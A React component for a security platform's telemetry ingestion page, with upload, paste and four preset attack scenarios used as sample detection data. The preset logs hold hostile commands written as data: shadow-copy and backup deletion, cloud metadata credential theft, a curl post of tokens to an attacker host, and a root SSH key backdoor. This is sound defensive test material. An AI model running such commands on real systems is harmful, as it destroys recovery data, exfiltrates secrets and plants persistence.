import React, { useState, useRef } from 'react';
import { Dataset, User } from '../types/index.ts';
import {
  Database,
  Upload,
  RefreshCw,
  FileText,
  FileCode,
  CheckCircle2,
  AlertTriangle,
  Trash2,
  Eye,
  Network,
  Sparkles,
  ArrowRight,
  ShieldAlert,
  Flame,
  Cloud,
  Terminal,
  HelpCircle,
  Download,
  Filter
} from 'lucide-react';

interface DatasetsPageProps {
  datasets: Dataset[];
  currentUser: User;
  onRefresh: () => void;
  onSelectDataset: (datasetId: string) => void;
  onNavigateToGraph?: () => void;
  onNavigateToResearch?: () => void;
}

interface PresetScenario {
  id: string;
  name: string;
  icon: React.ReactNode;
  category: string;
  description: string;
  sourceType: 'sysmon' | 'netflow' | 'auth_log' | 'jsonl';
  eventCount: number;
  data: string;
}

const PRESET_SCENARIOS: PresetScenario[] = [
  {
    id: 'scenario-lockbit',
    name: 'LockBit 3.0 Ransomware Precursor & VSS Tampering',
    icon: <Flame className="w-4 h-4 text-rose-400" />,
    category: 'Ransomware / Impact',
    description: 'Adversary executes vssadmin shadow deletion, bcdedit recovery disabling, and mimikatz credential dumping before staging encrypter.',
    sourceType: 'sysmon',
    eventCount: 5,
    data: `timestamp,host,user,process_name,process_cmd,src_ip,dst_ip,dst_port,severity
2026-10-20T04:10:00Z,WKSTN-FIN-09,CORP\\administrator,powershell.exe,powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgA...,10.0.4.19,185.220.101.4,443,high
2026-10-20T04:11:15Z,WKSTN-FIN-09,CORP\\administrator,vssadmin.exe,vssadmin.exe delete shadows /all /quiet,10.0.4.19,10.0.4.19,0,critical
2026-10-20T04:11:45Z,WKSTN-FIN-09,CORP\\administrator,bcdedit.exe,bcdedit.exe /set {default} recoveryenabled No,10.0.4.19,10.0.4.19,0,critical
2026-10-20T04:12:30Z,WKSTN-FIN-09,CORP\\administrator,wbadmin.exe,wbadmin.exe delete catalog -quiet,10.0.4.19,10.0.4.19,0,high
2026-10-20T04:14:00Z,WKSTN-FIN-09,CORP\\administrator,rundll32.exe,rundll32.exe C:\\ProgramData\\lockbit.dll StartProc,10.0.4.19,185.220.101.4,8443,critical`
  },
  {
    id: 'scenario-cobalt',
    name: 'Cobalt Strike Named Pipe & SMB Lateral Pivot',
    icon: <ShieldAlert className="w-4 h-4 text-orange-400" />,
    category: 'Lateral Movement',
    description: 'Compromised workstation utilizes PsExec service installations and named pipes (msse-1244) to pivot to the secondary Domain Controller.',
    sourceType: 'sysmon',
    eventCount: 4,
    data: `timestamp,host,user,process_name,process_cmd,src_ip,dst_ip,dst_port,severity
2026-10-20T03:00:10Z,WKSTN-DEV-03,CORP\\svc_deploy,rundll32.exe,rundll32.exe beacon.dll Start,10.0.2.14,198.51.100.77,443,high
2026-10-20T03:02:40Z,WKSTN-DEV-03,CORP\\svc_deploy,cmd.exe,cmd.exe /c net use \\\\DC02.corp.local\\IPC$ /u:CORP\\svc_deploy,10.0.2.14,10.0.0.2,445,high
2026-10-20T03:04:15Z,DC02.corp.local,CORP\\svc_deploy,services.exe,C:\\Windows\\System32\\services.exe,10.0.2.14,10.0.0.2,445,critical
2026-10-20T03:06:00Z,DC02.corp.local,CORP\\svc_deploy,powershell.exe,powershell.exe -w hidden -nop -c "Get-ADUser -Filter *",10.0.0.2,10.0.0.1,389,high`
  },
  {
    id: 'scenario-cloud-imds',
    name: 'Cloud IMDS SSRF & IAM Token Exfiltration',
    icon: <Cloud className="w-4 h-4 text-cyan-400" />,
    category: 'Cloud Security / SSRF',
    description: 'Web application vulnerability exploited via SSRF against Link-Local Metadata (169.254.169.254) to harvest temporary AWS IAM security tokens.',
    sourceType: 'netflow',
    eventCount: 4,
    data: `timestamp,host,user,process_name,process_cmd,src_ip,dst_ip,dst_port,severity
2026-10-20T02:15:00Z,WEB-PROD-APP01,www-data,nginx,nginx: worker process,203.0.113.15,10.0.10.4,80,medium
2026-10-20T02:15:12Z,WEB-PROD-APP01,www-data,curl,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role,10.0.10.4,169.254.169.254,80,critical
2026-10-20T02:16:30Z,WEB-PROD-APP01,www-data,python3,python3 -c "import boto3; s3 = boto3.client('s3')",10.0.10.4,52.216.0.0,443,high
2026-10-20T02:18:00Z,WEB-PROD-APP01,www-data,curl,curl -X POST -d @tokens.json https://advegress-c2.net/drop,10.0.10.4,198.51.100.88,443,critical`
  },
  {
    id: 'scenario-bpfdoor',
    name: 'Linux BPFdoor Stealth Raw Socket & Persistence',
    icon: <Terminal className="w-4 h-4 text-emerald-400" />,
    category: 'Persistence / Kernel Evasion',
    description: 'BPFdoor stealth implant binds raw packet filters on Linux edge router, listens for magic ICMP packet, and injects root backdoor shell.',
    sourceType: 'jsonl',
    eventCount: 4,
    data: `{"timestamp":"2026-10-20T01:10:00Z","host":"EDGE-ROUTER-01","user":"root","process_name":"sh","process_cmd":"/dev/shm/.x11-unix/bpf_filter -d","src_ip":"198.51.100.5","dst_ip":"10.0.0.254","dst_port":0,"severity":"critical"}
{"timestamp":"2026-10-20T01:10:45Z","host":"EDGE-ROUTER-01","user":"root","process_name":"iptables","process_cmd":"iptables -I INPUT -p icmp -j ACCEPT","src_ip":"10.0.0.254","dst_ip":"10.0.0.254","dst_port":0,"severity":"high"}
{"timestamp":"2026-10-20T01:12:10Z","host":"EDGE-ROUTER-01","user":"root","process_name":"bash","process_cmd":"echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...' >> /root/.ssh/authorized_keys","src_ip":"10.0.0.254","dst_ip":"10.0.0.254","dst_port":0,"severity":"critical"}
{"timestamp":"2026-10-20T01:15:00Z","host":"EDGE-ROUTER-01","user":"root","process_name":"sshd","process_cmd":"sshd: root@pts/2","src_ip":"198.51.100.5","dst_ip":"10.0.0.254","dst_port":22,"severity":"high"}`
  }
];

export const DatasetsPage: React.FC<DatasetsPageProps> = ({
  datasets,
  currentUser,
  onRefresh,
  onSelectDataset,
  onNavigateToGraph,
  onNavigateToResearch
}) => {
  const [activeImportTab, setActiveImportTab] = useState<'upload' | 'preset' | 'paste'>('upload');
  const [isUploading, setIsUploading] = useState(false);
  const [isDeleting, setIsDeleting] = useState<string | null>(null);
  const [name, setName] = useState('');
  const [description, setDescription] = useState('');
  const [sourceType, setSourceType] = useState<'sysmon' | 'netflow' | 'auth_log' | 'jsonl'>('sysmon');
  const [rawContent, setRawContent] = useState('');
  const [uploadMessage, setUploadMessage] = useState<{ type: 'success' | 'error'; text: string; datasetId?: string } | null>(null);
  const [previewRows, setPreviewRows] = useState<any[]>([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [dragActive, setDragActive] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Parse first few rows for live pre-ingestion validation
  const updateContentPreview = (content: string) => {
    setRawContent(content);
    if (!content.trim()) {
      setPreviewRows([]);
      return;
    }
    try {
      const trimmed = content.trim();
      if (trimmed.startsWith('{') || trimmed.startsWith('[')) {
        if (trimmed.startsWith('[')) {
          const arr = JSON.parse(trimmed);
          setPreviewRows(arr.slice(0, 3));
        } else {
          const lines = trimmed.split('\n').filter(l => l.trim()).slice(0, 3);
          const parsed = lines.map(l => JSON.parse(l));
          setPreviewRows(parsed);
        }
      } else {
        const lines = trimmed.split('\n').filter(l => l.trim());
        if (lines.length >= 2) {
          const headers = lines[0].split(',').map(h => h.trim().replace(/^"|"$/g, ''));
          const rows = lines.slice(1, 4).map(line => {
            const vals = line.split(',').map(v => v.trim().replace(/^"|"$/g, ''));
            const obj: Record<string, string> = {};
            headers.forEach((h, idx) => {
              obj[h] = vals[idx] || '';
            });
            return obj;
          });
          setPreviewRows(rows);
        }
      }
    } catch {
      // ignore parse preview error
    }
  };

  // Handle local file reading
  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      processFile(file);
    }
  };

  const processFile = (file: File) => {
    const reader = new FileReader();
    reader.onload = (event) => {
      const content = event.target?.result as string;
      const fileNameClean = file.name.replace(/\.[^/.]+$/, '').replace(/[-_]/g, ' ');
      setName(prev => prev || `Imported: ${fileNameClean}`);
      setDescription(prev => prev || `Ingested from file "${file.name}" (${(file.size / 1024).toFixed(1)} KB)`);

      if (file.name.endsWith('.json') || file.name.endsWith('.jsonl')) {
        setSourceType('jsonl');
      } else if (file.name.toLowerCase().includes('netflow')) {
        setSourceType('netflow');
      } else {
        setSourceType('sysmon');
      }

      updateContentPreview(content);
    };
    reader.readAsText(file);
  };

  // Drag and drop handlers
  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
    setDragActive(true);
  };

  const handleDragLeave = (e: React.DragEvent) => {
    e.preventDefault();
    setDragActive(false);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setDragActive(false);
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      processFile(e.dataTransfer.files[0]);
    }
  };

  // Load a preset scenario
  const handleSelectPreset = (scenario: PresetScenario) => {
    setName(scenario.name);
    setDescription(scenario.description);
    setSourceType(scenario.sourceType);
    updateContentPreview(scenario.data);
  };

  // Submit Upload to Backend
  const handleUpload = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!name || !rawContent.trim()) {
      setUploadMessage({ type: 'error', text: 'Dataset name and telemetry content are required.' });
      return;
    }

    setIsUploading(true);
    setUploadMessage(null);

    try {
      const res = await fetch('/api/v1/datasets/upload', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-user-id': currentUser.id
        },
        body: JSON.stringify({
          name,
          description,
          sourceType,
          rawContent
        })
      });

      const data = await res.json();
      if (!res.ok) {
        throw new Error(data.error || 'Dataset ingestion failed');
      }

      setUploadMessage({
        type: 'success',
        text: `Successfully ingested ${data.parsedCount} security events into dataset "${name}". MITRE rule engine evaluated & 3D attack graph recomputed.`,
        datasetId: data.dataset?.id
      });

      setName('');
      setDescription('');
      setRawContent('');
      setPreviewRows([]);
      if (fileInputRef.current) fileInputRef.current.value = '';
      onRefresh();
    } catch (err: any) {
      setUploadMessage({ type: 'error', text: `Ingestion Error: ${err.message}` });
    } finally {
      setIsUploading(false);
    }
  };

  // Delete Custom Dataset
  const handleDeleteDataset = async (datasetId: string) => {
    if (!confirm('Are you sure you want to purge this dataset and all its normalized events from the engine?')) {
      return;
    }

    setIsDeleting(datasetId);
    try {
      const res = await fetch(`/api/v1/datasets/${datasetId}`, {
        method: 'DELETE',
        headers: { 'x-user-id': currentUser.id }
      });
      if (res.ok) {
        onRefresh();
      } else {
        const data = await res.json();
        alert(data.error || 'Failed to delete dataset');
      }
    } catch (err) {
      console.error('Error deleting dataset:', err);
    } finally {
      setIsDeleting(null);
    }
  };

  // Filter datasets by search query
  const filteredDatasets = datasets.filter(ds => {
    if (!searchQuery) return true;
    const q = searchQuery.toLowerCase();
    return ds.name.toLowerCase().includes(q) || ds.description.toLowerCase().includes(q) || ds.sourceType.toLowerCase().includes(q);
  });

  return (
    <div className="space-y-6">
      {/* Top Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 p-4 bg-slate-900 border border-slate-800 rounded-xl shadow-lg">
        <div>
          <h1 className="text-xl font-bold text-white flex items-center gap-2">
            <Database className="w-5 h-5 text-cyan-400" />
            <span>Telemetry Datasets & Ingestion Pipeline</span>
          </h1>
          <p className="text-xs text-slate-400 mt-1 max-w-2xl leading-relaxed">
            Ingest, normalize, and validate network flows, Sysmon logs, and authentication pivots into canonical event records. Ingested datasets automatically populate the 3D Attack Graph and MITRE detection rules.
          </p>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={onRefresh}
            className="flex items-center gap-1.5 px-3 py-1.5 text-xs bg-slate-950 hover:bg-slate-800 text-slate-300 border border-slate-800 rounded-lg transition-colors font-mono"
            title="Reload all datasets"
          >
            <RefreshCw className="w-3.5 h-3.5" />
            <span>Refresh</span>
          </button>
        </div>
      </div>

      {/* Main Ingestion Studio Component */}
      <div className="p-5 bg-slate-900 border border-cyan-900/50 rounded-xl shadow-xl space-y-5">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-3">
          <div className="flex items-center gap-2.5">
            <div className="p-2 bg-cyan-950/80 border border-cyan-800 rounded-lg">
              <Upload className="w-4 h-4 text-cyan-400" />
            </div>
            <div>
              <h2 className="text-sm font-bold text-white flex items-center gap-2">
                <span>Import Telemetry Dataset</span>
                <span className="text-[10px] bg-cyan-950 text-cyan-300 border border-cyan-800 px-2 py-0.5 rounded font-mono">
                  Multi-Format Engine
                </span>
              </h2>
              <p className="text-[11px] text-slate-400">
                Upload files (.csv, .json, .jsonl), pick from 4 curated adversary campaigns, or paste raw event streams.
              </p>
            </div>
          </div>

          {/* Import Modes Switcher */}
          <div className="flex items-center bg-slate-950 border border-slate-800 rounded-lg p-1">
            <button
              onClick={() => setActiveImportTab('upload')}
              className={`px-3 py-1 text-xs font-mono rounded flex items-center gap-1.5 transition-all ${
                activeImportTab === 'upload'
                  ? 'bg-cyan-600 text-white font-bold shadow'
                  : 'text-slate-400 hover:text-white hover:bg-slate-900'
              }`}
            >
              <Upload className="w-3.5 h-3.5" />
              <span>File Upload</span>
            </button>
            <button
              onClick={() => setActiveImportTab('preset')}
              className={`px-3 py-1 text-xs font-mono rounded flex items-center gap-1.5 transition-all ${
                activeImportTab === 'preset'
                  ? 'bg-cyan-600 text-white font-bold shadow'
                  : 'text-slate-400 hover:text-white hover:bg-slate-900'
              }`}
            >
              <Sparkles className="w-3.5 h-3.5" />
              <span>Curated Scenarios</span>
            </button>
            <button
              onClick={() => setActiveImportTab('paste')}
              className={`px-3 py-1 text-xs font-mono rounded flex items-center gap-1.5 transition-all ${
                activeImportTab === 'paste'
                  ? 'bg-cyan-600 text-white font-bold shadow'
                  : 'text-slate-400 hover:text-white hover:bg-slate-900'
              }`}
            >
              <FileCode className="w-3.5 h-3.5" />
              <span>Direct Paste</span>
            </button>
          </div>
        </div>

        {/* Feedback Alert Banner */}
        {uploadMessage && (
          <div className={`p-4 rounded-xl border flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs font-mono animate-in fade-in duration-200 ${
            uploadMessage.type === 'error'
              ? 'bg-rose-950/80 border-rose-800 text-rose-200'
              : 'bg-emerald-950/80 border-emerald-800 text-emerald-200'
          }`}>
            <div className="flex items-center gap-2.5">
              {uploadMessage.type === 'error' ? (
                <AlertTriangle className="w-4 h-4 text-rose-400 shrink-0" />
              ) : (
                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
              )}
              <span>{uploadMessage.text}</span>
            </div>

            {uploadMessage.type === 'success' && uploadMessage.datasetId && (
              <div className="flex items-center gap-2 shrink-0">
                <button
                  onClick={() => onSelectDataset(uploadMessage.datasetId!)}
                  className="px-2.5 py-1 bg-emerald-700 hover:bg-emerald-600 text-white rounded text-[11px] font-semibold flex items-center gap-1 transition-colors"
                >
                  <Eye className="w-3 h-3" />
                  <span>Inspect Ingested Events</span>
                </button>
                {onNavigateToGraph && (
                  <button
                    onClick={onNavigateToGraph}
                    className="px-2.5 py-1 bg-cyan-700 hover:bg-cyan-600 text-white rounded text-[11px] font-semibold flex items-center gap-1 transition-colors"
                  >
                    <Network className="w-3 h-3" />
                    <span>View in 3D Graph</span>
                  </button>
                )}
              </div>
            )}
          </div>
        )}

        {/* Tab 1: File Drag & Drop Upload */}
        {activeImportTab === 'upload' && (
          <div className="space-y-4">
            <div
              onDragOver={handleDragOver}
              onDragLeave={handleDragLeave}
              onDrop={handleDrop}
              onClick={() => fileInputRef.current?.click()}
              className={`border-2 border-dashed rounded-xl p-8 text-center cursor-pointer transition-all flex flex-col items-center justify-center gap-3 ${
                dragActive
                  ? 'border-cyan-400 bg-cyan-950/40 text-cyan-300 scale-[1.01]'
                  : 'border-slate-800 hover:border-slate-700 bg-slate-950/60 hover:bg-slate-950/90 text-slate-400'
              }`}
            >
              <input
                ref={fileInputRef}
                type="file"
                accept=".csv,.json,.jsonl,.txt,.log"
                onChange={handleFileChange}
                className="hidden"
              />
              <div className="p-3 bg-slate-900 border border-slate-800 rounded-full">
                <Upload className="w-6 h-6 text-cyan-400 animate-bounce" />
              </div>
              <div>
                <span className="text-sm font-semibold text-white">
                  Drop your CSV, JSON, JSONL, or Sysmon log file here
                </span>
                <span className="block text-xs text-slate-500 mt-1 font-mono">
                  or click to browse local files (Supports headers: timestamp, host, user, process, cmd, src_ip, dst_ip, port, severity)
                </span>
              </div>
            </div>
          </div>
        )}

        {/* Tab 2: Curated Adversary Scenarios */}
        {activeImportTab === 'preset' && (
          <div className="space-y-3">
            <div className="text-xs text-slate-400 font-mono">
              Select an industry-standard adversary emulation scenario to populate the detection & 3D attack graph engine in one click:
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              {PRESET_SCENARIOS.map((scenario) => (
                <div
                  key={scenario.id}
                  onClick={() => handleSelectPreset(scenario)}
                  className="p-3.5 bg-slate-950 border border-slate-800 hover:border-cyan-700/80 rounded-xl cursor-pointer transition-all hover:bg-slate-950/90 group"
                >
                  <div className="flex items-center justify-between text-xs mb-1.5">
                    <div className="flex items-center gap-1.5 font-bold text-white group-hover:text-cyan-300">
                      {scenario.icon}
                      <span>{scenario.name}</span>
                    </div>
                    <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-900 border border-slate-800 text-cyan-400">
                      {scenario.eventCount} Events
                    </span>
                  </div>
                  <p className="text-xs text-slate-400 line-clamp-2 leading-relaxed">
                    {scenario.description}
                  </p>
                  <div className="mt-2 pt-2 border-t border-slate-850 flex items-center justify-between text-[11px] font-mono text-slate-500">
                    <span>Category: {scenario.category}</span>
                    <span className="text-cyan-400 font-medium group-hover:underline flex items-center gap-1">
                      <span>Load Scenario</span>
                      <ArrowRight className="w-3 h-3" />
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Tab 3: Direct Paste Raw Content */}
        {activeImportTab === 'paste' && (
          <div className="space-y-2">
            <div className="flex items-center justify-between">
              <label className="text-xs font-medium text-slate-400">
                Raw Telemetry Records (CSV with headers or newline-delimited JSON)
              </label>
              <button
                type="button"
                onClick={() => handleSelectPreset(PRESET_SCENARIOS[0])}
                className="text-xs text-cyan-400 hover:underline font-mono"
              >
                Load Sample CSV Telemetry
              </button>
            </div>
            <textarea
              value={rawContent}
              onChange={(e) => updateContentPreview(e.target.value)}
              rows={5}
              placeholder="timestamp,host,user,process_name,process_cmd,src_ip,dst_ip,dst_port,severity&#10;2026-10-20T04:10:00Z,WKSTN-FIN-09,CORP\admin,vssadmin.exe,vssadmin.exe delete shadows /all,10.0.4.19,10.0.4.19,0,critical"
              className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3 text-xs font-mono text-slate-200 placeholder-slate-700 focus:outline-none focus:border-cyan-500"
            />
          </div>
        )}

        {/* Dataset Metadata Configuration Form */}
        <form onSubmit={handleUpload} className="space-y-4 pt-2 border-t border-slate-800">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
            <div>
              <label className="block text-xs font-medium text-slate-400 mb-1">
                Dataset Name <span className="text-rose-400">*</span>
              </label>
              <input
                type="text"
                value={name}
                onChange={(e) => setName(e.target.value)}
                placeholder="e.g. Finance Subnet Firewall Egress"
                required
                className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-1.5 text-xs text-slate-100 placeholder-slate-600 focus:outline-none focus:border-cyan-500"
              />
            </div>

            <div>
              <label className="block text-xs font-medium text-slate-400 mb-1">Telemetry Format</label>
              <select
                value={sourceType}
                onChange={(e) => setSourceType(e.target.value as any)}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-1.5 text-xs text-slate-100 focus:outline-none focus:border-cyan-500 font-mono"
              >
                <option value="sysmon">Windows Sysmon / Process Lineage (CSV/JSON)</option>
                <option value="netflow">NetFlow / IPFIX Flow Records</option>
                <option value="auth_log">Windows Security Event Logs (4624/4625/4768)</option>
                <option value="jsonl">Generic Normalized JSON Lines (JSONL)</option>
              </select>
            </div>

            <div>
              <label className="block text-xs font-medium text-slate-400 mb-1">Description</label>
              <input
                type="text"
                value={description}
                onChange={(e) => setDescription(e.target.value)}
                placeholder="Incident scenario or host scope notes"
                className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-1.5 text-xs text-slate-100 placeholder-slate-600 focus:outline-none focus:border-cyan-500"
              />
            </div>
          </div>

          {/* Pre-Ingestion Live Schema Preview */}
          {previewRows.length > 0 && (
            <div className="bg-slate-950 border border-slate-800/80 rounded-xl p-3 space-y-2">
              <div className="flex items-center justify-between text-xs">
                <span className="font-mono text-cyan-300 font-bold flex items-center gap-1.5">
                  <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                  Schema Auto-Detected ({previewRows.length} Sample Records Preview)
                </span>
                <span className="text-[10px] font-mono text-slate-500">
                  Canonical UTC ISO-8601 normalization active
                </span>
              </div>

              <div className="overflow-x-auto">
                <table className="w-full text-left font-mono text-[11px] border-collapse">
                  <thead>
                    <tr className="border-b border-slate-800 text-slate-400">
                      <th className="py-1 px-2">Host</th>
                      <th className="py-1 px-2">User</th>
                      <th className="py-1 px-2">Process / Image</th>
                      <th className="py-1 px-2">Command Line</th>
                      <th className="py-1 px-2">Target IP:Port</th>
                      <th className="py-1 px-2">Severity</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-850 text-slate-300">
                    {previewRows.map((row, idx) => (
                      <tr key={idx} className="hover:bg-slate-900/50">
                        <td className="py-1 px-2 text-cyan-400">{row.host || row.computer || 'N/A'}</td>
                        <td className="py-1 px-2 text-slate-300">{row.user || row.username || 'N/A'}</td>
                        <td className="py-1 px-2 text-indigo-300">{row.process_name || row.image || 'N/A'}</td>
                        <td className="py-1 px-2 text-slate-400 truncate max-w-xs">{row.process_cmd || row.commandline || 'N/A'}</td>
                        <td className="py-1 px-2 text-amber-300">{row.dst_ip ? `${row.dst_ip}:${row.dst_port || 0}` : 'Local'}</td>
                        <td className="py-1 px-2">
                          <span className={`px-1.5 py-0.5 rounded text-[9px] uppercase font-bold ${
                            row.severity === 'critical' ? 'bg-rose-950 text-rose-300' : 'bg-slate-800 text-slate-300'
                          }`}>
                            {row.severity || 'medium'}
                          </span>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* Submit Action Bar */}
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-2">
            <div className="text-[11px] text-slate-400 flex items-center gap-2">
              <Sparkles className="w-3.5 h-3.5 text-cyan-400" />
              <span>Ingestion triggers rule matching, isolation anomaly scoring, and 3D attack graph re-correlation.</span>
            </div>

            <button
              type="submit"
              disabled={isUploading || !name || !rawContent.trim()}
              className="px-5 py-2.5 bg-cyan-600 hover:bg-cyan-500 disabled:opacity-50 text-white font-mono font-bold text-xs rounded-xl transition-all shadow-lg flex items-center justify-center gap-2"
            >
              {isUploading ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  <span>Normalizing & Correlating...</span>
                </>
              ) : (
                <>
                  <Upload className="w-4 h-4" />
                  <span>Ingest & Trigger Threat Pipeline</span>
                </>
              )}
            </button>
          </div>
        </form>
      </div>

      {/* Active Datasets Catalog */}
      <div className="space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div className="flex items-center gap-2">
            <h2 className="text-base font-bold text-white">Active Telemetry Datasets</h2>
            <span className="text-xs px-2 py-0.5 rounded-full bg-slate-800 text-cyan-300 font-mono">
              {datasets.length} Active Stores
            </span>
          </div>

          <div className="relative w-full sm:w-64">
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Filter datasets by name or format..."
              className="w-full bg-slate-900 border border-slate-800 rounded-lg px-3 py-1.5 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-cyan-500"
            />
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {filteredDatasets.map((ds) => {
            const isCustom = ds.id.startsWith('ds-custom-');

            return (
              <div
                key={ds.id}
                className="p-5 bg-slate-900 border border-slate-800 hover:border-slate-700 rounded-xl flex flex-col justify-between transition-all shadow-md group"
              >
                <div>
                  <div className="flex items-center justify-between text-xs text-slate-400 mb-2">
                    <span className="font-mono text-cyan-300 font-semibold uppercase px-2 py-0.5 rounded bg-slate-950 border border-slate-800">
                      {ds.sourceType}
                    </span>
                    <div className="flex items-center gap-2">
                      <span className="font-mono text-[11px] text-slate-400">
                        {new Date(ds.createdAt).toLocaleDateString()}
                      </span>
                      {isCustom && (
                        <button
                          onClick={() => handleDeleteDataset(ds.id)}
                          disabled={isDeleting === ds.id}
                          className="p-1 text-slate-500 hover:text-rose-400 transition-colors"
                          title="Purge custom dataset"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                        </button>
                      )}
                    </div>
                  </div>

                  <h3 className="text-sm font-bold text-white group-hover:text-cyan-300 transition-colors">
                    {ds.name}
                  </h3>
                  <p className="text-xs text-slate-300 mt-1 leading-relaxed line-clamp-2">
                    {ds.description}
                  </p>
                </div>

                <div className="mt-4 pt-3 border-t border-slate-800/80 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                  <div className="flex items-center gap-3 text-xs font-mono text-slate-400">
                    <span>Events: <strong className="text-white tabular-nums">{ds.totalEvents}</strong></span>
                    <span>Parsed: <strong className="text-emerald-400 tabular-nums">{ds.parsedEvents}</strong></span>
                    {ds.skippedEvents > 0 && (
                      <span>Skipped: <strong className="text-rose-400 tabular-nums">{ds.skippedEvents}</strong></span>
                    )}
                  </div>

                  <div className="flex items-center gap-2">
                    <button
                      onClick={() => onSelectDataset(ds.id)}
                      className="px-2.5 py-1 text-xs font-semibold text-cyan-400 hover:text-white bg-slate-950 border border-slate-800 hover:border-cyan-700 rounded-lg transition-colors flex items-center gap-1 font-mono"
                    >
                      <Eye className="w-3 h-3" />
                      <span>Inspect Events</span>
                    </button>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
};
